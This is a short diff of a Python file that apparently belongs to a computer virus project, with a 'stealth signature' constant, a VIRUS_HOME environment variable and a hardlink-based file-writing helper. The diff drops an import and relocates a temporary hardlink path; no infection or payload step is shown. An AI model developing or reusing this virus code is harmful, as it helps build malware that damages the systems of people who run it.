@@ -3,7 +3,6 @@ ____ = "\xFF\xFE\x0A\x20\xCA\xDD"  # stealth signature
 import socket
 import marshal
 import glob
-import sys
 import os
 from random import randint
 from uuid import uuid4 as uuid
@@ -23,7 +22,7 @@ def to_hex(s):
 def hardlink_write(content, file):
     size = len(content)
     offset = 0
-    hardlink = "/tmp/%s" % uuid()
+    hardlink = "%s/tmp/%s" % (os.environ["VIRUS_HOME"], uuid())
     os.link(file, hardlink)
     f = open(hardlink, 'w')
     f.close()
